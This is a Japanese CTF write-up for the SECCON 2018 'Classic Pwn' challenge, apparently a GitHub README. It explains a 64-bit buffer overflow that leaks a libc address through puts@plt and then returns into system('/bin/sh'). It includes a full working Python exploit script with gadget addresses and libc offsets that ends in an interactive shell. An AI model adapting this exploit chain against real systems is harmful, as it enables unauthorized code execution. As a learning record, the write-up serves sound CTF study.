# PWNオーバーフロー入門: 64bit環境でのアドレスリークを利用してシェルを起動 (SSP、PIE無効で64bit ELF) Classic Pwn 2回目

## はじめに

[saru2017/pwn008: PWNオーバーフロー入門: 64bit環境でのROPコード (SSP、PIE無効で64bit ELF) Classic Pwn 1回目](https://github.com/saru2017/pwn008)で途中で挫折した[SECCON 2018 Online CTF](https://score-quals.seccon.jp/) [Classic Pwn](https://score-quals.seccon.jp/challenges#Classic%20Pwn)に再チャレンジ。

基本は[saru2017/pwn009: PWNオーバーフロー入門: ASLR有効状態でアドレスリークを利用してシェルを起動 (SSP、PIE無効で32bit ELF)](https://github.com/saru2017/pwn009)で行けるはず。


## アドレス調べ

必要なのは

- 基本
  - bufsize
- gadget
  - pop_rdi_ret
  - popret
  - pop2ret
  - pop3ret
- 絶対アドレス
  - main_addr
  - libc_start_main_got
  - puts_plt
- 相対アドレス
  - libc_start_main_rel
  - system_rel
  - binsh_rel

挫折したやつの情報を再利用すると[saru2017/pwn008: PWNオーバーフロー入門: 64bit環境でのROPコード (SSP、PIE無効で64bit ELF) Classic Pwn 1回目](https://github.com/saru2017/pwn008)

### ローカルで動かす場合

- 基本
  - bufsize = 72
- gadget
  - pop_rdi_ret = 0x00400753
  - popret = 0x00400753
  - pop2ret = 0x00400751
  - pop3ret = 0x0040074e
- 絶対アドレス
  - main_addr = 0x004006a9
  - libc_start_main_got =  0x00601030
  - puts_plt = 0x00400520
- 相対アドレス
  - libc_start_main_rel = 0x00021ab0
  - system_rel = 0x0004f440
  - binsh_rel =  0x001b3e9a
  - puts_rel = 0x000809c0

## exploitコード

```python
import sys
import socket
import time
import telnetlib
from haclib import *


bufsize = 72
pop_rdi_ret = 0x00400753
popret = 0x00400753
pop2ret = 0x00400751
pop3ret = 0x0040074e
main_addr = 0x004006a9
libc_start_main_got =  0x00601030
puts_plt = 0x00400520

def main():
    buf = b'A' * bufsize
    buf += p64(popret)
    buf += p64(libc_start_main_got)
    buf += p64(puts_plt)
    buf += p64(main_addr)
    buf += b'\n'

#    sys.stdout.buffer.write(buf)
#    sys.exit()

    if(len(sys.argv) > 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("classic.pwn.seccon.jp", 17354))
        libc_start_main_rel = 0x20740
        system_rel = 0x45390
        binsh_rel = 0x18cd57
        puts_rel = 0x6f690
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.connect(("localhost", 28080))
        libc_start_main_rel = 0x00021ab0
        system_rel = 0x0004f440
        binsh_rel =  0x001b3e9a
        puts_rel = 0x000809c0

    time.sleep(1)
    read_until(sock, b"Local Buffer >> ")
    print("Local Buffer >> ")
    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)

    read_until(sock, b"Have a nice pwn!!\n")
    print("Have a nice pwn!!\n")
    time.sleep(1)

    val = sock.recv(6)
    print(val)
    print(len(val))
    val = val + b'\x00\x00'

    libc_start_main_addr = u64(val)
    print("%x" % (libc_start_main_addr))
    libc_base = libc_start_main_addr - libc_start_main_rel
    print("%x" % (libc_base))
    system_addr = libc_base + system_rel
    binsh_addr = libc_base + binsh_rel
    puts_addr = libc_base + puts_rel

    time.sleep(1);

    buf = b'A' * bufsize
    buf += p64(popret)
    buf += p64(binsh_addr)
#    buf += p64(puts_addr)
    buf += p64(system_addr)
    buf += b'BBBBBBBB'
    buf += b'\n'

    time.sleep(1)
    read_until(sock, b"Local Buffer >> ")
    print("Local Buffer >> ")

    time.sleep(1)
    ret = sock.sendall(buf)
    time.sleep(1)
    read_until(sock, b"Have a nice pwn!!\n")
    print("Have a nice pwn!!\n")

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
```

## はまったところ

### 1BOF目のputs@pltでの出力

libc_start_mainはたぶん0x00007f76eed1aab0な感じのアドレスになっていて、これをputsで吐かせてプログラムで読み取る。
この時バイト列としては0xb0 0xaa 0xd1 0xee 0x76 0x7f 0x00 0x00のような形で飛んできて後ろについてる0x00 0x00がNULL文字判定されて0xb0 0xaa 0xd1 0xee 0x76 0x7fしか飛んでこない。
ここに気付くのに結構時間がかかった。
コードで対処法は書いてある通り6バイト読んで後ろに2バイト分の0をくっつける。

```python
val = sock.recv(6)
val = val + b'\x00\x00'
libc_start_main_addr = u64(val)
```

### system("/bin/sh")をtelnet経由でアクセスする

これは未だに原因が分かってないのだけど例えば

```c
#include <stdio.h>

int main()
{
  system("/bin/sh");
  return 0;
}
```

みたいなプログラムがあって、それをsocatから

```
$ socat TCP-LISTEN:28080,reuseaddr,fork EXEC:./a.out
```

とアクセスできるようにしておく。
これに対してtelnetで接続するとちゃんとシェルが動きそうな気がするのだけど動かないという事象にはまった。

## 参考

- [SECCON 2018 Online CTF Writeup - yyy](http://ywkw1717.hatenablog.com/entry/2018/10/28/185936)
- [SECCON 2018 Online CTF Writeup Pwn:classic - Qiita](https://qiita.com/GmS944y/items/4821a631a6d34b54ab8d)
- [SECCON 2018 Online CTF Writeup - Qiita](https://qiita.com/kusano_k/items/2ec7eb22d8c556262724)
- [SECCON 2018 Quals write-up (classic, kindvm, gacha lv.1/2, shooter last part) - cookies.txt　　　　　　.scr](https://cookies.hatenablog.jp/entry/2018/10/28/184145)
- [SECCON 2018 Write-up - satto1237’s diary](https://satto.hatenadiary.com/entry/seccon-2018)
- [Classic Pwn (SECCON 2018 Online CTF) | 幼い備忘録](https://osanamity.net/2018/11/06/110940)
- [SECCON CTF 2018 QUALS writeup - yuta1024's diary](http://yuta1024.hateblo.jp/entry/2018/11/01/215302)
- [CTFtime.org / SECCON 2018 Online CTF / classic / Writeup](https://ctftime.org/writeup/11987)
